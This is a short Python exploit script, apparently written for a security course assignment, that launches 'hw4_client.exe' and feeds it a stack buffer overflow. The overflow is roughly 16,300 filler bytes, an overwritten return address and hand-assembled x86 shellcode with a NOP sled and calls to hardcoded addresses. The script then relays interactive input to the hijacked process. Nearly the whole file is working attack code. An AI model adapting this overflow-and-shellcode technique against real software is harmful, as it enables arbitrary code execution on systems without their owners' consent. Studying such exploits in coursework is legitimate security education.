from subprocess import Popen, PIPE, STDOUT

if __name__ == '__main__':
    p = Popen(['hw4_client.exe'], stdin=PIPE)
    introduction = b"archer\n2BBVAFEX2RNFB2NF\nPEEK\n"
    override = b"\x00" + b"a" * 16303 + b'\x28\x20\x50\x62'
    package = b"\xeb\x20\x90\x90\xe8\xdc\x5f\x00"
    package += b"\x90" * 32
    package += b"\x81\xEC\x00\x40\x00\x00"
    package += b"\x89\xE2"
    package += b"\x52"
    package += b"\x68\x68\x61\x50\x62"
    package += b"\xE8\x70\xC2\x50\x62"
    package += b" \x83\xEC\x08"
    package += b"\x6A\x00"
    package += b"\x68\x80\x80\x50\x62"
    package += b"\x52"
    package += b"\x6A\x07"
    package += b"\x8D\x55\x08"
    package += b"\x52"
    package += b"\xE8\x8E\x18\x50\x62"
    package += b"\xEB\xDB"
    p.stdin.write(introduction + override + package + b"\n")
    p.stdin.flush()
    user_input = ""
    while user_input != "exit":
        user_input = input("\nPEEK_INPUT>>")
        p.stdin.flush()
        p.stdin.write(user_input.encode()+b"\n")
        p.stdin.flush()

    p.kill()
